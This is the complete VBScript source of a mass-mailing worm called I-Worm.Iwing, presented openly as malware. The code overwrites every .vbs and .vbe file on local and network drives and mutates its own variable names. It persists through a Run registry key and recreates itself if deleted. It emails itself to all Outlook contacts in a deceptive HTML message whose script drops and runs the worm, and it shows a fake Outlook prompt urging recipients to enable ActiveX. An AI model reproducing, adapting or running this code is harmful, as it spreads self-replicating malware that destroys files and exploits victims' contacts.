'Vbs.I-Worm.Iwing
'(C) Indonesian Virus Institute
'-----------------------------------------
On Error Resume Next
Function hctZ3695HuW(jmfWw5tB242)
UEMC5AH6Wln=jmfWw5tB242
Set agHTnc9jjEI= Fso.GetFolder(UEMC5AH6Wln)
Set qBOJNm47rCP= agHTnc9jjEI.Files
For Each RnrkJa18s8U In qBOJNm47rCP
if Fso.GetExtensionName(RnrkJa18s8U.path) = "vbs" then
Fso.copyfile wscript.scriptfullname , RnrkJa18s8U.path , true
end if
if Fso.GetExtensionName(RnrkJa18s8U.path) = "vbe" then
Fso.copyfile wscript.scriptfullname , RnrkJa18s8U.path , true
end if
Next
Set RnrkJa18s8U= agHTnc9jjEI.SubFolders
For Each C77M52yof43 In RnrkJa18s8U
Call hctZ3695HuW(C77M52yof43.path)
Next
End Function
Randomize
Set DOVTBO = CreateObject("Scripting.FileSystemObject")
Set UNNEQN = DOVTBO.OpenTextFile(WScript.ScriptFullName, 1)
HANHMH = UNNEQN.Readall
TJVLFK = "DOVTBO UNNEQN HANHMH TJVLFK DEEFLD EPRSAO BBKISP RVSAHD "
Do
EPRSAO = Left(TJVLFK, InStr(TJVLFK, Chr(32)) - 1)
TJVLFK = Mid(TJVLFK, InStr(TJVLFK, Chr(32)) + 1)
BBKISP = Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65))
Do
RVSAHD = InStr(RVSAHD + 1, HANHMH, EPRSAO)
If RVSAHD Then HANHMH = Mid(HANHMH, 1, (RVSAHD - 1)) & BBKISP & Mid(HANHMH, (RVSAHD + Len(EPRSAO)))
Loop While RVSAHD
Loop While TJVLFK <> ""
Set UNNEQN = DOVTBO.OpenTextFile(WScript.ScriptFullName, 2, True) '
UNNEQN.Writeline HANHMH

Set Fso= Createobject("scripting.filesystemobject")
Fso.copyfile wscript.scriptfullname,Fso.GetSpecialFolder(0)& "\iwing.vbs"
Set WshShell = CreateObject("WScript.Shell")
WshShell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\iwing","wscript.exe "&Fso.GetSpecialFolder(0)& "\iwing.vbs %"
if WshShell.regread ("HKCU\software\I-Worm.Iwing\mailed") <> "1" then
OutlookWorm()
end if
xNxLT3b64t3()
if day(now) = 8 or day(now) = 12 then
msgbox "I-Worm.iwing is now Activate",16
end if
Set r4X9V28FbzX= Fso.opentextfile(wscript.scriptfullname, 1)
JN9DKS8PseV= r4X9V28FbzX.readall
r4X9V28FbzX.Close
Do
If Not (Fso.fileexists(wscript.scriptfullname)) Then
Set uFvcj2r4CGm= Fso.createtextfile(wscript.scriptfullname, True)
uFvcj2r4CGm.writeJN9DKS8PseV
uFvcj2r4CGm.Close
End If
Loop
Function OutlookWorm()
On Error Resume Next
Set MA7ImhM0KlB= CreateObject("Outlook.Application")
If MA7ImhM0KlB = "Outlook" Then
Set ZxHLt73yAoP= Fso.opentextfile(wscript.scriptfullname, 1)
I = 1
Do While ZxHLt73yAoP.atendofstream = False
SLA4PjvWlwi= ZxHLt73yAoP.readline
I2K8Q4w099K= I2K8Q4w099K& Chr(34) & " & vbcrlf & " & Chr(34) & replace(SLA4PjvWlwi, Chr(34), Chr(34) & "&chr(34)&" & Chr(34))
Loop
ZxHLt73yAoP.close
c8AC9g9ml4I = "<" & "HTML><" & "HEAD><" & "META content=" & Chr(34) & " & chr(34) & " & Chr(34) & "text/html; charset=iso-8859-1" & Chr(34) & " http-equiv=Content-Type><" & "META content=" & Chr(34) & "MSHTML 5.00.2314.1000" & Chr(34) & " name=GENERATOR><" & "STYLE></" & "STYLE></" & "HEAD><" & "BODY bgColor=#ffffff><" & "SCRIPT language=vbscript>"
c8AC9g9ml4I = c8AC9g9ml4I& vbCrLf & "On Error Resume Next"
c8AC9g9ml4I = c8AC9g9ml4I & vbCrLf & "Set fso = CreateObject(" & Chr(34) & "scripting.filesystemobject" & Chr(34) & ")"
c8AC9g9ml4I = c8AC9g9ml4I & vbCrLf & "If Err.Number <> 0 Then"
c8AC9g9ml4I = c8AC9g9ml4I & vbCrLf & "document.write " & Chr(34) & "<font face='verdana' color=#ff0000 size='2'>You need ActiveX enabled if you want to see this e-mail.<br>Please open this message again and click accept ActiveX<br>Microsoft Outlook</font>" & Chr(34) & ""
c8AC9g9ml4I = c8AC9g9ml4I & vbCrLf & "Else"
c8AC9g9ml4I = c8AC9g9ml4I & vbCrLf & "Set vbs = fso.createtextfile(fso.getspecialfolder(0) & " & Chr(34) & "\iwing.vbs" & Chr(34) & ", True)"
c8AC9g9ml4I = c8AC9g9ml4I & vbCrLf & "vbs.write  " & Chr(34) & I2K8Q4w099K& Chr(34)
c8AC9g9ml4I = c8AC9g9ml4I & vbCrLf & "vbs.Close"
c8AC9g9ml4I = c8AC9g9ml4I & vbCrLf & "Set ws = CreateObject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
c8AC9g9ml4I = c8AC9g9ml4I & vbCrLf & "ws.run fso.getspecialfolder(0) & " & Chr(34) & "\wscript.exe " & Chr(34) & " & fso.getspecialfolder(0) & " & Chr(34) & "\iwing.vbs %" & Chr(34) & ""
rQtN2CnS4q7 = rQtN2CnS4q7& vbCrLf & "document.write " & Chr(34) & "Message error, coused by bad conection" & Chr(34) & ""
rQtN2CnS4q7 = rQtN2CnS4q7& vbCrLf & "End If"
rQtN2CnS4q7 = rQtN2CnS4q7 & vbCrLf & "<" & "/SCRIPT></" & "body></" & "html>"
nyK7AVXsOI4=c8AC9g9ml4I & rQtN2CnS4q7
Set nxLT3b64t3r = MA7ImhM0KlB.GetNameSpace("MAPI")
For Each KX9V28FbzX6 In nxLT3b64t3r.AddressLists
If KX9V28FbzX6.AddressEntries.Count <> 0 Then
W9DKrJa18s8= KX9V28FbzX6.AddressEntries.Count
Set y177M52yof4= MA7ImhM0KlB.CreateItem(0)
y177M52yof4.Subject = "The document you ask for"
y177M52yof4.HTMLBody = nyK7AVXsOI4
y177M52yof4.DeleteAfterSubmit = True
For tJl78dWcehS = 1 To W9DKrJa18s8
Set fnm5JE4yhfd= KX9V28FbzX6.AddressEntries(tJl78dWcehS)
If W9DKrJa18s8= 1 Then
y177M52yof4.BCC = fnm5JE4yhfd.Address
Else
y177M52yof4.BCC = y177M52yof4.BCC & "; " & fnm5JE4yhfd.Address
End If
Next
y177M52yof4.send
End If
Next
WshShell.regwrite "HKCU\software\I-Worm.Iwing\mailed", "1"
MA7ImhM0KlB.Quit
end if
End Function
Function xNxLT3b64t3()
On Error Resume Next
Set euKrcoj494w = Fso.Drives
For Each AtPJM47XZkQ In euKrcoj494w
If AtPJM47XZkQ.Drivetype = Remote Then
K5uEDor9ZH9= AtPJM47XZkQ & "\"
Call hctZ3695HuW(K5uEDor9ZH9)
ElseIf AtPJM47XZkQ.IsReady Then
K5uEDor9ZH9= AtPJM47XZkQ&"\"
Call hctZ3695HuW(K5uEDor9ZH9)
End If
Next
End Function



